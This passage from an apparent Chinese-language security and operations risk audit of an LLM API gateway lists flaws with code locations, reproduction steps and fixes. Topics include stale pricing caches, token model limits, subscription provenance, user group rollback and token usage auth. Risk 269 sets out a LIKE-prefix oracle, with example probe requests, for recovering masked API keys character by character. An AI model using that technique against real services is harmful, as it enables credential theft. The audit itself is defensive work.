  - `controller/channel_upstream_update.go:398-420` 与 `controller/channel_upstream_update.go:812-828`：上游模型同步/应用会更新 channel models、重建 abilities 和刷新 runtime cache，但没有刷新 pricing cache。
  - `controller/model_meta.go:80-159`：模型 metadata create/update/delete 会 `model.RefreshPricing()`，这是正向边界。
  - `controller/vendor_meta.go:57-123`：vendor create/update/delete 成功后不调用 `RefreshPricing()`；vendor 维度旧缓存已由风险 223 覆盖，本轮把它纳入统一失效缺口。
- 可能后果：Root 把某模型价格从低价调高后，真实 relay 的 `ModelPriceHelper` 会立即读取新的 ratio_setting 扣费，但 `/api/pricing` 仍可能在 1 分钟内展示旧低价，用户按旧价格预期发起请求却被新价格扣费，产生计费投诉。反向降价或临时促销时，价格页仍显示旧高价，用户可能不敢使用，运营活动效果受损。Root 下线某个渠道模型或删除 abilities 后，模型列表 `/v1/models` 可能已经消失，但价格页仍显示该模型可用；或者自动同步新增模型后真实可见列表更新，价格页延迟显示，客服无法解释“API 可用但模型广场没有”。多实例部署时还会叠加 option/channel 同步窗口和每实例 1 分钟 pricing cache TTL。
- 复现思路：本地先请求 `/api/pricing` 建立缓存；随后通过 Root 更新 `ModelPrice` 或 `ModelRatio` 中某个 enabled 模型的价格，立刻再次请求 `/api/pricing`，观察是否仍返回旧价格，同时发起一次本地 relay 或调用 `ModelPriceHelper` 验证真实扣费使用新配置。渠道能力复现可先缓存 pricing，再禁用/删除某渠道或把模型从 channel models 移除，立即请求 `/api/pricing` 与 `/v1/models` 对比模型是否一旧一新。
- 修复建议：建立统一 pricing invalidation 入口。所有影响价格页的写路径都应调用 `model.InvalidatePricingCache()` 或 `model.RefreshPricing()`：传统 ratio/group/cache/audio/image option、billing setting、模型 metadata、vendor CRUD、channel add/update/delete、abilities 重建、上游模型 apply/sync、FixAbility。为了避免循环依赖，可在 ratio_setting loader 的上层 `updateOptionMap` 中按 key 白名单失效 pricing cache，而不是从 ratio_setting 反向引用 model。接口响应可返回 `pricing_cache_invalidated=true` 和新 pricing version；前端在保存价格/渠道/metadata 后应清理 React Query pricing 缓存并重新拉取。多实例场景应通过 Redis pub/sub 或版本号广播 pricing invalidation，不能只清当前实例。
- 优先级：P2
- 当前状态：已确认多个影响 pricing 的写路径没有统一失效 `pricingMap`；真实扣费和价格页展示可能短期分叉，尚未修复。

### 风险 267：前端保存价格/模型/供应商/渠道后不失效 `['pricing']`，模型广场可在本地继续显示旧价格和旧供应商长达 5 分钟

- 标题：默认前端 `/pricing` 使用 React Query `queryKey: ['pricing']` 且 `staleTime=5 分钟`。系统设置保存 `ModelPrice/ModelRatio/GroupRatio/...`、模型 metadata create/update/delete、vendor create/update/delete、渠道编辑/上游模型 apply 等写路径，只失效 `system-options`、models/vendors/channels 自己的列表，未失效 `['pricing']`。因此即使后端未来修复 1 分钟 pricing cache，已打开或近期访问过模型广场的前端仍会继续展示旧价格、旧供应商和旧可用模型。
- 影响范围：模型广场 `/pricing`、模型详情页、价格筛选/排序、供应商筛选、用户价格预期、Root 刚保存的模型定价、模型 metadata/vendor 管理、渠道模型上下线、上游模型同步结果和客服截图证据。
- 触发条件：用户或管理员已经打开过 `/pricing`；Root/Admin 在另一个页面保存价格设置、模型 metadata、vendor、渠道模型列表或上游模型同步；随后回到 `/pricing` 或模型详情页但 React Query 判断 `['pricing']` 仍未 stale。
- 涉及文件/函数：
  - `web/default/src/features/pricing/hooks/use-pricing-data.ts:24-31`：pricing 查询使用 `queryKey: ['pricing']`，`staleTime: 5 * 60 * 1000`。
  - `web/default/src/features/system-settings/hooks/use-update-option.ts:42-58`：通用 option 保存成功只失效 `['system-options']`，部分展示相关 key 额外失效 `['status']`；`ModelPrice/ModelRatio/GroupRatio/CompletionRatio/CacheRatio/ImageRatio/AudioRatio` 不会触发 `['pricing']` 失效。
  - `web/default/src/features/system-settings/models/ratio-settings-card.tsx:362-402`：模型价格表保存逐个调用 `updateOption.mutateAsync`，没有在保存结束后统一 invalidate `['pricing']`。
  - `web/default/src/features/models/components/drawers/model-mutate-drawer.tsx:419-604`：模型 create/update 后可能同步更新 `ModelPrice/ModelRatio/...`，成功后只失效 `modelsQueryKeys.lists()` 和 `['system-options']`。
  - `web/default/src/features/models/components/dialogs/vendor-mutate-dialog.tsx:96-109` 与 `web/default/src/features/models/lib/vendor-actions.ts:38-43`：vendor 新增/更新/删除只失效 vendors/models 列表，不失效 pricing。
  - `web/default/src/features/channels/components/channels-provider.tsx:82-85`、`web/default/src/features/channels/lib/channel-actions.ts` 和渠道 drawer/upstream apply 路径：渠道变更主要刷新 channels 列表；不会让已打开的模型广场重新拉取 pricing。
  - `docs/newapi-ops-risk-audit.md:8258-8287`：风险 266 覆盖后端 pricing cache 缺统一失效；本轮新增前端本地查询缓存的独立延迟。
- 可能后果：Root 刚把高成本模型涨价或改成固定价格，真实请求已按新配置扣费，但运营自己打开的模型广场仍显示旧低价，截图发给用户后产生计费争议。Root 刚删除或禁用供应商，模型管理页已变，但模型广场筛选仍显示旧供应商。渠道刚移除某模型或上游同步刚新增模型，`/pricing` 仍保持旧模型列表，用户可能认为下架失败或上架未生效。因为前端缓存时间长于后端 pricing cache TTL，问题可能在单浏览器内持续到 5 分钟或手动刷新。
- 复现思路：本地打开 `/pricing` 建立 `['pricing']` cache；转到系统设置把某 enabled 模型的 `ModelPrice` 改成明显不同值并保存，或在模型管理里修改 vendor 名称/模型状态；不刷新页面直接回到 `/pricing`，观察价格、vendor 或模型是否仍为旧值。打开 React Query DevTools 或抓包确认没有重新请求 `/api/pricing`。渠道模型变更同理：先缓存 pricing，再编辑渠道 models 或 apply upstream changes，回到 pricing 对比 `/api/channel/models_enabled` 与页面展示。
- 修复建议：建立共享 query key 和失效工具，例如 `pricingQueryKeys.all = ['pricing']`。所有会影响模型广场的 mutation 成功后都应 `invalidateQueries({ queryKey: ['pricing'] })`：模型定价 option、group ratio、billing setting、模型 metadata、vendor、channel add/update/delete、tag batch edit、upstream apply/sync、FixAbility。`useUpdateOption` 可按 key 白名单失效 pricing；模型/vendor/channel action helper 可统一调用 `invalidatePricingData(queryClient)`。保存价格后最好主动跳出旧截图风险：toast 中提示“价格页已刷新”，并在 pricing 页面显示 `pricing_version` 或 `updated_at` 便于确认当前口径。
- 优先级：P2
- 当前状态：已确认前端相关写路径没有失效 `['pricing']`，模型广场可继续展示旧口径；尚未修复。

### 风险 268：token model limits 的 `/v1/models` 展示不与用户分组 enabled abilities 求交集，可把已下架或非本组模型显示为可用

- 标题：普通用户创建/编辑 token 时，前端模型限制选项来自 `/api/user/models`，该接口只按用户可用分组聚合 enabled abilities，不按 `HasModelBillingConfig` 过滤；前端还把结果以 `['user-models']` 缓存 5 分钟。更关键的是，token 一旦启用 `model_limits`，`/v1/models` 分支只遍历 token allowlist 并按计费配置过滤，不再和当前 token group/user group 的 enabled abilities 求交集。因此 token 可以在模型发现接口里展示“已下架、当前分组无渠道、或前端旧缓存里残留”的模型，真实 relay 再因无渠道或未定价失败。
- 影响范围：API token 创建/编辑、token 模型白名单、`/v1/models` 模型发现、Claude/OpenAI/Gemini 客户端自动选模型、渠道下架/分组迁移、未定价模型、用户客服截图和下游客户权限说明。
- 触发条件：用户打开 token 创建页后，站点下线某模型、移除分组能力或修改价格配置；或 `/api/user/models` 本身返回 enabled 但未配置价格的模型；或用户/脚本直接把不属于当前分组但有价格配置的模型写入 `model_limits`。随后用该 token 调用 `/v1/models` 或真实 relay。
- 涉及文件/函数：
  - `controller/user.go:551-575`：`GetUserModels` 只按 `service.GetUserUsableGroups(user.Group)` 和 `model.GetGroupEnabledModels(group)` 返回模型并集；不检查 `helper.HasModelBillingConfig`、用户 `AcceptUnsetRatioModel` 或 token group。
  - `web/default/src/lib/api.ts:188-195`：前端 `getUserModels()` 直接请求 `/api/user/models`。
  - `web/default/src/features/keys/components/api-keys-mutate-drawer.tsx:103-110`：token drawer 用 `queryKey: ['user-models']` 拉模型并缓存 5 分钟。
  - `web/default/src/features/keys/components/api-keys-mutate-drawer.tsx:521-538`：`model_limits` MultiSelect 直接把 `['user-models']` 数据作为可选项，没有标记未定价/已下架/当前 token group 不可用。
  - `web/default/src/features/keys/lib/api-key-form.ts:103-109`：提交时只要选择数组非空就保存 `model_limits_enabled=true` 和逗号拼接的模型名。
  - `controller/token.go:167-225` 与 `controller/token.go:258-308`：token 创建/更新后端直接保存 `ModelLimitsEnabled/ModelLimits`，不校验模型是否仍在用户分组 enabled abilities 中，也不校验是否已配置计费。
  - `controller/model.go:228-248`：`/v1/models` 在 token model limit 启用时，只遍历 `tokenModelLimit`；若 `HasModelBillingConfig(allowModel)` 通过就加入返回，不和 `GetGroupEnabledModels(ownerGroups)` 求交集。
  - `middleware/distributor.go:57-80`：真实 relay 只先校验请求模型是否在 token allowlist；后续仍要按当前 group/model 选渠，token allowlist 不能保证有可用渠道。
  - `docs/newapi-ops-risk-audit.md:5333-5363`：风险 200 已覆盖空/畸形 CSV、空格和前端显示 Unlimited；本轮新增聚焦正常模型名在 token allowlist、用户模型 API、`/v1/models` 与真实 enabled abilities 之间的口径分裂。
- 可能后果：运营把某高成本模型从用户分组下架后，已有 token 若仍保存该模型限制，`/v1/models` 仍可能向客户端报告该模型可用；客户端自动选择后真实请求失败，用户看到“模型列表里有，但调用无渠道/无权限”。用户在 token 创建页打开期间，后台刚移除某模型，前端 5 分钟旧 `['user-models']` 仍能把它保存进新 token。未配置价格的 enabled 模型也会进入 token 创建选择器，用户创建后 `/v1/models` 默认又把它过滤掉或 Anthropic 分支触发空列表风险，形成“刚选的模型不见了/不可用”。对企业用户来说，token 模型白名单是下游权限合同，这种展示与真实可调用不一致会直接增加客服和对账争议。
- 复现思路：本地创建一个用户分组可见且有价格的模型 `model-a`，打开 token 创建页缓存 `['user-models']`；随后从渠道/abilities 移除 `model-a` 或把 token group 切到不包含该模型的分组，再用前端旧选项创建 token，观察 token 保存成功。调用该 token 的 `/v1/models`，若 `model-a` 仍有计费配置会继续显示；真实请求 `model-a` 则在分发/选渠阶段失败。未定价模型复现可创建 enabled ability 但不配置价格，观察 `/api/user/models` 允许选择，而 token `/v1/models` 或真实调用默认不可用。
- 修复建议：统一“token 可选模型”和“token 模型发现”口径。`/api/user/models` 应提供可选过滤参数或默认复用 `/v1/models` 的可调用过滤：按用户/token group、enabled abilities、计费配置和 `AcceptUnsetRatioModel` 求交集，并返回 `pricing_status/group/channel_available`。token 保存后端必须校验 `model_limits` 中每个模型对该用户或 token group 当前可用，或至少保存时返回 warning/invalid_models 并拒绝无效项。`/v1/models` 的 token-limit 分支应把 allowlist 与 ownerGroups enabled models 求交集，而不是只信 token 字符串。前端 token drawer 保存成功/打开时应失效 `['user-models']`，模型列表项应标记“未定价/当前 token group 不可用/将不可调用”。
- 优先级：P2
- 当前状态：已确认 token model limit 展示口径不与 enabled abilities 求交集，前端可保存旧/未定价模型限制；尚未修复。

### 风险 269：token key 搜索允许对真实 key 做 `LIKE` 前缀探测，脱敏列表仍可被逐位枚举成完整 key

- 标题：token 列表和详情响应虽然统一返回 masked key，但 `/api/token/search?token=` 会把用户输入直接作为真实 `tokens.key LIKE` 条件。因为 masked key 暴露前 4 位和后 4 位，调用者可以从前 4 位开始用 `已知前缀 + 候选字符 + %` 反复搜索，根据 `total/items` 是否命中逐位恢复自己的完整 key。该路径不跨用户，但它绕过了“列表只脱敏展示”和未来可能增加的完整 key step-up 语义。
- 影响范围：普通用户 API token 列表、token 搜索、default/classic 前端 key 过滤框、系统 access token 或旧 session 持有者、未来移除完整 key 回显后的凭证保护边界、客服排障截图和审计口径。
- 触发条件：攻击者持有用户 dashboard session、系统 access token 或任何能访问该用户 `/api/token/search` 的凭据，但不应直接接触完整 API key；目标用户 token 数量不超过 `MaxUserTokens`，因此后端允许带 `%` 的模糊搜索；攻击者能从列表 mask 看到目标 key 的前 4 位。
- 涉及文件/函数：
  - `controller/token.go:34-62`：`GetAllTokens/SearchTokens` 响应前会调用 `buildMaskedTokenResponses`，所以正常响应不直接回显原始 key。
  - `model/token.go:38-56`：`MaskTokenKey` 对 8 位以上 key 返回前 4 位、10 个星号、后 4 位。
  - `model/token.go:95-122`：`sanitizeLikePattern` 允许最多 2 个 `%`，不禁止 `prefix%` 这类前缀探测模式。
  - `model/token.go:127-181`：`SearchUserTokens` 去掉 `sk-` 后，把 token 搜索条件传入 `tokens.key LIKE ? ESCAPE '!'`；`total` 和分页 items 会暴露是否命中。
  - `setting/operation_setting/token_setting.go:7-27`：默认 `MaxUserTokens=1000`，一般用户低于该值时允许模糊搜索。
  - `web/default/src/features/keys/components/api-keys-table.tsx:254-287` 与 `332-340`：default 前端把 “Filter by API key...” 输入传给 `searchApiKeys({ token })`。
  - `web/classic/src/hooks/tokens/useTokensData.jsx:310-323`：classic 前端也把 `searchToken` 透传到 `/api/token/search?token=...`。
  - `controller/token_test.go:421-444`：已有测试只断言搜索响应不包含原始 key，没有覆盖搜索条件作为 oracle 的行为。
- 可能后果：站点即使把完整 key 查看接口加上 step-up 或改成只创建时显示一次，只要保留当前 token key 搜索，旧 session/access token 仍可通过多次搜索恢复自己的完整 key。恢复出的 API key 可继续被复制到外部客户端，造成余额消耗、模型权限滥用或客户子 key 泄露事故；运营审计只看到普通 token 搜索请求，不会像“查看完整 key”那样留下明确的密钥接触事件。因为 token key 是 48 位字母数字，逐位枚举最多约 `48 * 62` 次搜索即可恢复单个 key；`CriticalRateLimit` 未挂在搜索路由上时，这个成本对自动化脚本很低。
- 复现思路：本地创建一个测试 token，打开 token 列表读取 masked key 前缀，例如 `abcd**********wxyz`。请求 `/api/token/search?token=abcda%`、`/api/token/search?token=abcdb%` ...，观察只有真实第 5 位会返回 `total=1/items`。继续把已知前缀扩展为 `abcdeX%`，逐位恢复完整 key。全程只使用本地测试用户和自有 token，不对真实用户 token 做枚举。
- 修复建议：不要支持对真实 token key 做任意 `LIKE` 搜索。可选方案：只允许按后端保存的不可逆 fingerprint 搜索，例如 `sha256(key)[:8]`；或只允许用户输入完整 key 后做常量时间哈希/等值校验，不返回模糊命中；或仅按 masked prefix/suffix 的公开字段搜索，不能进入真实 key 列。若产品必须保留 key 搜索，应要求和完整 key 查看同级的 step-up、禁止 access token、强限流、搜索原因和结构化审计，并且不要在响应中暴露可用于逐位推断的精确 total。
- 优先级：P2
- 当前状态：已确认搜索响应脱敏，但搜索条件可作为真实 key 的前缀/LIKE oracle；尚未修复。

### 风险 279：`user_subscriptions` 只有粗粒度 `source`，没有保存产生该权益的订单、兑换码或管理员操作 ID，成功套餐无法从权益反向追溯原始发放事件

- 标题：`CreateUserSubscriptionFromPlanTx` 创建 `user_subscriptions` 时只保存 `Source=order/admin/redemption`，不保存 `source_order_trade_no/source_order_id/redemption_id/admin_action_id`；一个 active 订阅实例无法直接指向产生它的支付订单、兑换码或后台操作。
- 影响范围：订阅购买成功后的客服对账、支付退款/拒付后的权益回收、兑换码活动成本追踪、管理员补偿审计、同用户多套餐/多次续购、套餐作废/删除、业务日志与资产状态核对。
- 触发条件：用户通过支付购买套餐，或通过兑换码/管理员绑定获得套餐；随后出现退款、拒付、用户投诉“套餐来源不明”、多次续购同套餐、兑换码活动复盘、管理员误发/补偿争议或需要撤销某次具体发放。
- 涉及文件/函数：
  - `model/subscription.go:241-264`：`UserSubscription` 字段只有 `UserId/PlanId/AmountTotal/AmountUsed/StartTime/EndTime/Status/Source/Reset/UpgradeGroup` 等，没有原始订单、兑换码或后台操作外键。
  - `model/subscription.go:547-607`：`CreateUserSubscriptionFromPlanTx` 接收的 source 只是字符串，并在创建记录时只写 `Source: source`。
  - `model/subscription.go:647-651`：支付完成路径调用 `CreateUserSubscriptionFromPlanTx(tx, order.UserId, plan, "order")`，没有把 `SubscriptionOrder.Id` 或 `order.TradeNo` 写入用户订阅。
  - `model/subscription.go:748-769`：管理员绑定路径调用 `CreateUserSubscriptionFromPlanTx(tx, userId, plan, "admin")`；`sourceNote` 参数没有进入 `UserSubscription`，也没有后台操作 ID。
  - `model/redemption.go:180-199`：订阅兑换码路径创建 `source=redemption` 的 `UserSubscription`，然后把 redemption 标记 used；但用户订阅没有保存 `redemption.Id` 或兑换码批次信息。
  - `model/subscription.go:803-831`：用户/管理员查询订阅实例时只返回 `SubscriptionSummary{Subscription:&sub}`，没有 join 原始订单、兑换码或资产流水。
  - `web/default/src/features/subscriptions/types.ts:62-73`：前端订阅类型只包含 `source`，没有 source id 或订单号字段。
  - `web/default/src/features/subscriptions/components/dialogs/user-subscriptions-dialog.tsx:291-299`：后台用户订阅管理只显示 plan 和 `Source` 文本，无法展示“由哪笔订单/哪张兑换码/哪个管理员操作产生”。
- 可能后果：同一用户多次购买同套餐后，客服看到多个 active/expired 订阅，只能知道它们都是 `source=order`，无法确认哪一条对应某个 `trade_no` 或第三方支付事件；处理退款/拒付时不能精准回收对应权益，只能按时间、套餐和金额人工猜测。兑换码活动也只能从兑换码表查 `UsedUserId`，不能从用户当前权益反向定位具体兑换码；管理员赠送只显示 `source=admin`，没有原因、审批或操作记录锚点，误发后难以复盘。若未来增加自动退款回滚、订阅转移或订单详情页，这个缺失会让“收入事件”和“权益实例”无法可靠一一对应。
- 复现思路：本地创建同一用户的两笔订阅支付订单并完成相同套餐，查询 `user_subscriptions` 只能看到两条 `source=order` 记录，没有 `trade_no`；再创建一个订阅兑换码并兑换，查询该用户订阅只能看到 `source=redemption`，无法从订阅记录定位 redemption id。打开后台用户订阅管理，确认前端只显示 Source，不显示订单号、兑换码或管理员操作原因。
- 修复建议：为 `user_subscriptions` 增加不可变来源锚点：`source_type`、`source_id`、`source_trade_no`、`source_provider`、`source_event_id`、`source_admin_id`、`source_reason`、`source_snapshot`。支付路径写入 `SubscriptionOrder.Id/TradeNo/PaymentProvider/Money`，兑换码路径写入 `Redemption.Id/Name/Batch`，管理员路径写入操作人、reason 和审批/二次验证 ID。更好的设计是建立统一 `asset_grants` 表，所有权益发放先写资产流水，再由 `user_subscriptions.source_grant_id` 指向它；退款/作废/删除也写反向事件，避免只靠文本日志和时间推断。
- 优先级：P2
- 当前状态：已确认成功套餐权益缺少原始发放事件外键；尚未修复。

### 风险 280：`users.group` 没有来源所有权，订阅到期回退可能覆盖管理员手动改组意图

- 标题：用户当前 group 只是单字段状态，订阅升级、兑换码、管理员编辑和注册默认都会写同一个 `users.group`；到期回退只比较当前 group 字符串和订阅 `UpgradeGroup`，无法判断当前 group 是否仍由该订阅拥有。
- 影响范围：订阅升级分组、管理员手动改组、兑换码套餐、用户可用模型/分组、分组倍率、充值分组价格、到期降级、客服解释和管理员审计。
- 触发条件：用户通过订阅或兑换码获得 `UpgradeGroup=vip`，系统把 `users.group` 从 `default` 改为 `vip` 并保存 `PrevUserGroup=default`；在套餐有效期内，管理员又出于白名单、补偿、企业客户或风控原因手动把用户 group 设为同一个 `vip`，但系统没有记录这个新的人工来源；订阅到期或被作废时，回退逻辑仍可能把用户降回 `default`。
- 涉及文件/函数：
  - `model/user.go:95-112`：用户表只有 `Group string`，没有 `group_source/group_owner_id/group_grant_id/group_reason/group_expires_at` 等来源字段。
  - `model/user.go:647-653`：管理员编辑用户时直接更新 `group`，没有写分组来源、原因或覆盖策略。
  - `controller/user.go:578-617`：管理员 `UpdateUser` 可编辑用户分组；接口没有要求 reason，也没有把旧分组/新分组绑定到资产或权益来源。
  - `web/default/src/features/users/components/users-mutate-drawer.tsx:318-356`：default 用户编辑抽屉只提供普通 group 下拉，没有展示该 group 是管理员手动、订阅升级、兑换码还是注册默认产生。
  - `model/subscription.go:547-607`：订阅发放时如果计划有 `UpgradeGroup`，读取当前 group 作为 `PrevUserGroup`，然后把 `users.group` 更新为 `UpgradeGroup`；这里只能保存单次快照，不能表达 group 所有权栈。
  - `model/subscription.go:748-769`：管理员绑定套餐同样通过 `CreateUserSubscriptionFromPlanTx(..., "admin")` 改 group；`sourceNote` 没有进入 group 或订阅来源字段。
  - `model/redemption.go:173-213`：订阅兑换码发放套餐后也会更新 group cache，但用户 group 本身无法反查是由哪个兑换码改动。
  - `model/subscription.go:832-916`：后台作废/删除订阅时按订阅保存的 `PrevUserGroup` 尝试回退 group，没有检查当前 group 是否后来被管理员显式接管。
  - `model/subscription.go:926-1007`：到期任务同样按最近 expired 订阅的 `PrevUserGroup` 回退；条件只看 `currentGroup == upgradeGroup`，无法区分“仍由订阅拥有”还是“管理员后来也设成同组”。
  - `middleware/auth.go:367-400`：正式 token 鉴权直接信任 `UserCache.Group` 计算用户可用分组和 token group，不知道 group 的来源或到期策略。
  - `service/group.go:10-65`：可用分组和倍率只基于当前 group 字符串与配置计算，不查询 group 来源。
- 可能后果：运营在套餐有效期内给用户做人工分组调整或补偿时，订阅到期任务可能把同名 group 当作订阅权益回滚，导致用户被意外降级、模型不可用或价格/倍率变化；反过来，如果管理员改到其他 group，订阅到期又会跳过回退，用户组最终状态也缺少可解释来源。客服看到的只有当前 group 和若干订阅记录，无法回答“这个用户为什么是 vip、是否应该到期降级、管理员是否手动保留过”。
- 复现思路：本地创建用户 `group=default`，创建带 `UpgradeGroup=vip` 的订阅使用户变为 `vip`；在订阅有效期内通过管理员用户编辑再次把该用户 group 保存为 `vip`，模拟人工保留意图；将订阅 `end_time` 调到过去并运行 `ExpireDueSubscriptions`。观察用户 group 会按订阅 `PrevUserGroup` 回到 `default`，而没有机制识别管理员后来手动确认过 `vip`。
- 修复建议：把 `users.group` 从单字段状态改成可解释的 group grant/ownership 模型。最小方案是增加 `group_source`、`group_source_id`、`group_reason`、`group_updated_by_admin_id`、`group_expires_at` 和 `group_version`；订阅到期只回滚仍由该订阅 grant 拥有的 group。更稳妥方案是新增 `user_group_grants` 表，记录注册默认、管理员手动、订阅、兑换码等多来源 grant，按优先级/有效期计算当前 group，并把回退、覆盖和人工保留都写审计流水。后台编辑用户 group 时必须要求 reason，并提示“是否覆盖订阅到期自动回退策略”。
- 优先级：P2
- 当前状态：已确认 group 来源所有权缺失；尚未修复。

## P3

### 风险 129：订阅 topup 镜像 upsert 只按 trade_no 查找普通充值表，跨表同号时可能覆盖错误 topup 记录

- 标题：`top_ups.trade_no` 和 `subscription_orders.trade_no` 分别唯一，但没有跨表唯一约束；订阅完成时若 `top_ups` 已存在同号记录，`upsertSubscriptionTopUpTx` 会更新该记录的 money/status/complete_time
- 影响范围：订阅购买镜像、普通充值订单、`users.topup_money`、充值分析、历史数据导入、手工改库/修复脚本、低概率订单号碰撞
- 触发条件：历史数据导入、手工修复、测试脚本或极低概率随机碰撞导致 `top_ups.trade_no` 已存在且等于待完成的 `subscription_orders.trade_no`；两者 `payment_method` 相同或普通 topup 的 payment_method 为空
- 涉及文件/函数：
  - `model/topup.go:15-25`：`TopUp.TradeNo` 只在 `top_ups` 表内唯一
  - `model/subscription.go:203-217`：`SubscriptionOrder.TradeNo` 只在 `subscription_orders` 表内唯一
  - `model/subscription.go:687-720`：`upsertSubscriptionTopUpTx` 先 `Where("trade_no = ?", order.TradeNo).First(&topup)`，存在时更新 `Money/CompleteTime/Status`
  - `model/subscription.go:709-714`：已有 topup 只校验 `PaymentMethod`，不校验 `UserId`、`PaymentProvider`、资产类型、原 status 或 source order id
  - `controller/subscription_payment_stripe.go:71-85`：Stripe 订阅使用 `sub_ref_...` 前缀
  - `controller/subscription_payment_epay.go:70-83`：Epay 订阅使用 `SUBUSR...` 前缀
  - `controller/subscription_payment_creem.go:77-90`：Creem 订阅使用 `sub_ref_...` 前缀
  - `controller/subscription_payment_waffo_pancake.go:70-83`：Pancake 订阅使用 `WAFFO_PANCAKE_SUB-...` 前缀
- 可能后果：如果发生跨表同号，订阅完成可能把一个普通充值记录改成订阅金额并标记 success，污染另一个用户或另一个支付网关的充值记录；随后刷新 `topup_money` 和充值分析时，收入统计会偏移。该问题在线上自然触发概率较低，因为当前订单号前缀大多区分普通充值和订阅，但数据迁移、人工修复或脚本导入时风险更现实。
- 复现思路：本地手工插入一条 `top_ups.trade_no = X`、`payment_method = stripe` 的 pending/failed 记录，再插入同 `trade_no = X` 的 Stripe `subscription_orders` pending 记录；调用 `CompleteSubscriptionOrder(X, ...)`，观察已有 topup 是否被更新为订阅订单金额和 success。
- 修复建议：订阅镜像不应通过裸 `trade_no` upsert 普通充值表。新增 `source_type/source_order_id`，并为订阅镜像使用唯一键 `(source_type, source_order_id)`；如果必须复用 `trade_no`，存在 topup 时必须同时校验 `user_id`、`payment_provider`、`asset_type=subscription_purchase`，否则拒绝并进入人工对账状态。数据导入工具也应做跨表 trade_no 冲突检查。
- 优先级：P3
- 当前状态：已确认跨表同号时订阅镜像 upsert 缺少足够断言，尚未修复。

### 风险 130：充值订单搜索的 COUNT 硬上限不可靠，管理员全平台搜索无时间窗口时可能形成大表扫描

- 标题：`searchTopUpCountHardLimit` 只是在 GORM 查询上调用 `Limit(...).Count(&total)`；对 `COUNT(*)` 聚合未必能限制扫描成本，管理员搜索还不限制时间窗口
- 影响范围：充值历史查询、管理员全平台充值记录、数据库性能、后台可用性、运营排障
- 触发条件：`top_ups` 表较大；管理员用短关键词或 `%` 模式搜索全平台订单；用户或管理员频繁触发充值历史搜索；数据库没有适合 `LIKE` 模式的索引命中
- 涉及文件/函数：
  - `model/topup.go:348-350`：定义 `searchTopUpCountHardLimit = 10000`
  - `model/topup.go:352-390`：用户搜索限定 `user_id` 和 30 天窗口，并清洗 LIKE 模式
  - `model/topup.go:392-430`：管理员 `SearchAllTopUps` 对全表搜索，不限制时间窗口
  - `model/topup.go:414-418`：全平台搜索用 `query.Limit(searchTopUpCountHardLimit).Count(&total)`
  - `controller/topup.go:480-503`：管理员接口直接调用全平台搜索
  - `router/api-router.go:128-133`：管理员充值列表和补单接口在 `AdminAuth` 下
- 可能后果：大表环境下，管理员全平台搜索可能触发昂贵的 `COUNT(*) + LIKE` 扫描，影响后台和支付回调同库性能；硬上限可能只限制返回页而不是 count 扫描量。该问题不是资产入账漏洞，但会在支付事故排查高峰期放大可用性风险。
- 复现思路：构造大量 `top_ups` 记录，在数据库打开慢查询日志；调用 `/api/user/topup?keyword=%abc%` 或短关键词搜索，观察生成 SQL 和 count 扫描行数是否被 10000 真正限制。
- 修复建议：管理员搜索也增加默认时间窗口和必须输入最小关键词长度；对 count 使用近似计数或先限定子查询 ID 再 count，例如 `SELECT COUNT(*) FROM (SELECT id FROM top_ups WHERE ... LIMIT 10000) t`。对精确订单号搜索优先走等值匹配，模糊搜索需要独立开关、速率限制和慢查询告警。
- 优先级：P3
- 当前状态：基于代码确认硬上限实现存在不可靠风险，尚未通过 SQL 日志验证具体方言表现。

### 风险 147：`/api/usage/token` 使用只读 token 认证，禁用、过期或耗尽 token 仍可查询用量并可能受缓存残留影响

- 标题：只读 usage 接口只验证 token key 存在和用户未禁用，明确不检查 token 状态、过期时间和剩余额度；删除/编辑后的 Redis token cache 又是异步失效
- 影响范围：`/api/usage/token`、OpenAI 兼容 usage 查询、第三方客户端账单探测、禁用/过期 token 的残留可见性、删除或禁用后的运营判断
- 触发条件：用户或管理员禁用、耗尽、过期或删除某个 token；第三方客户端继续用旧 key 查询 `/api/usage/token`；Redis token cache 开启且删除/更新 cache 的异步任务失败、延迟或在短窗口内尚未完成。
- 涉及文件/函数：
  - `router/api-router.go:290-297`：`/api/usage/token` 只挂载 `TokenAuthReadOnly`
  - `middleware/auth.go:210-214`：注释说明只读 token 认证“不检查令牌状态、过期时间和额度”
  - `middleware/auth.go:232-272`：实现只调用 `GetTokenByKey` 并检查用户状态，然后设置 `token_id/token_key`
  - `controller/token.go:118-165`：`GetTokenUsage` 读取 Authorization 中的 key 后再次 `GetTokenByKey`，返回该 token 的用量、余额、过期时间、状态和无限额度标记
  - `model/token.go:255-276`、`model/token_cache.go:52-64`：`GetTokenByKey` 优先从 Redis token cache 读取
  - `model/token.go:286-299`：编辑 token 后异步 `cacheSetToken`
  - `model/token.go:317-329`、`model/token.go:443-473`：单个删除和批量删除后异步删除 token cache
- 可能后果：被禁用、过期或耗尽的 key 仍能查询自身状态和用量，部分第三方客户端可能把 usage/subscription 成功响应误判为 key 仍可用；删除 token 后，如果 Redis cache 未及时删除，旧 key 仍可能短暂看到 usage 数据。该问题通常不直接允许继续 relay 扣费，因为正式 relay 走 `TokenAuth` 和 `ValidateUserToken`，但会造成凭证撤销后的信息残留和运维误判。
- 复现思路：创建 token 并请求一次填充 Redis cache；禁用或耗尽该 token 后调用 `/api/usage/token`，确认接口仍返回 usage 数据而不是 401。删除 token 后在 cache 删除前或模拟 Redis 删除失败，再用旧 key 查询 usage，观察是否还能读到缓存数据。
- 修复建议：把只读认证拆成两类：仅允许过期/耗尽 token 查询历史用量，但禁用、删除和用户撤销后的 token 必须拒绝；`GetTokenUsage` 不应再次无条件信任缓存，应按接口语义检查状态并在删除/禁用后立即同步失效 cache。对第三方兼容接口可返回明确的 `token_revoked` 或 `token_inactive` 状态，避免客户端误判为可继续使用。
- 优先级：P3
- 当前状态：已确认只读认证故意放宽状态/过期/额度校验，并依赖异步 cache 更新；尚未做 Redis 竞态复现。

### 风险 149：`/v1/models/:model` 和 `/v1/engines/:model` 单模型查询不按 token group 或模型限制过滤

- 标题：模型列表接口会按 token group、auto group 和 token model limit 过滤，但单模型查询只查静态 `openAIModelsMap`，不判断当前 token 是否有权使用该模型
- 影响范围：OpenAI 兼容模型发现、受限 token 的可见模型范围、第三方客户端自动探测、模型权限提示一致性
- 触发条件：token 设置了模型限制或固定 token group；客户端调用 `/v1/models/:model` 或 `/v1/engines/:model` 查询一个不在该 token 可用范围内但存在于静态模型表的模型。
- 涉及文件/函数：
  - `router/relay-router.go:19-41`：`/v1/models` 和 `/v1/models/:model` 都只挂 `TokenAuth`
  - `router/relay-router.go:44-54`：`/v1/engines/:model` 同样调用 `RetrieveModel`
